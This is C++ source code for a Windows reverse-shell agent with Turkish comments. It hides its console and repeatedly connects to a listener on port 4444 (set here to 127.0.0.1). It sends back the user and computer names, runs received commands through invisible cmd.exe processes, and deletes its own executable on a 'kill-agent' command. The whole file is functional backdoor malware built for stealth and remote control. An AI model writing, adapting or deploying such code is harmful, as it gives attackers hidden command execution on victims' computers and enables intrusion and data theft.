#include <winsock2.h>
#include <windows.h>
#include <lmcons.h> 
#include <iostream>
#include <string>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

// Bilgisayardan kendini tamamen silme fonksiyonu
void selfDestruct() {
    char szModuleName[MAX_PATH];
    char szCmd[MAX_PATH * 2];
    GetModuleFileNameA(NULL, szModuleName, MAX_PATH);

    // Windows'un dosyayı silebilmesi için bir batch dosyası oluşturup kendini sildirir
    string cmd = "/c del /f /q \"" + string(szModuleName) + "\" & exit";
    ShellExecuteA(NULL, "open", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
}

string getSystemInfo() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    char computername[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computername_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computername, &computername_len);
    return "User: " + string(username) + " | PC: " + string(computername);
}

string execCommand(string cmd) {
    if (cmd.substr(0, 3) == "cd ") {
        string path = cmd.substr(3);
        if (_chdir(path.c_str()) == 0) {
            char currentPath[MAX_PATH];
            _getcwd(currentPath, MAX_PATH);
            return "Dizin: " + string(currentPath) + "\n";
        }
        return "[-] Hata: Yol bulunamadi.\n";
    }

    if (cmd == "sysinfo") return getSystemInfo() + "\n";

    // Tamamen görünmez süreç başlatma (CREATE_NO_WINDOW)
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    string fullCmd = "cmd.exe /c " + cmd;

    if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        char buffer[4096];
        DWORD bytesRead;
        string result = "";
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result.empty() ? "[+] Islem tamam.\n" : result;
    }
    return "[-] Islem baslatilamadi.\n";
}

int main() {
    FreeConsole(); // Konsolu tamamen yok et

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET s;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(4444);

    while (true) {
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
            string info = getSystemInfo() + "\n";
            send(s, info.c_str(), info.length(), 0);

            char buffer[1024];
            while (true) {
                memset(buffer, 0, sizeof(buffer));
                int bytes = recv(s, buffer, sizeof(buffer), 0);
                if (bytes <= 0) break;

                string command(buffer);
                command = command.substr(0, command.find_first_of("\r\n"));

                if (command == "kill-agent") {
                    string bye = "[!] Agent imha ediliyor ve siliniyor...\n";
                    send(s, bye.c_str(), bye.length(), 0);
                    closesocket(s);
                    WSACleanup();
                    selfDestruct(); // ÖNCE SİL, SONRA KAPAN
                    exit(0);
                }

                if (command == "exit" || command == "back") break;

                string output = execCommand(command);
                send(s, output.c_str(), output.length(), 0);
            }
            closesocket(s);
        }
        Sleep(5000);
    }
    return 0;
}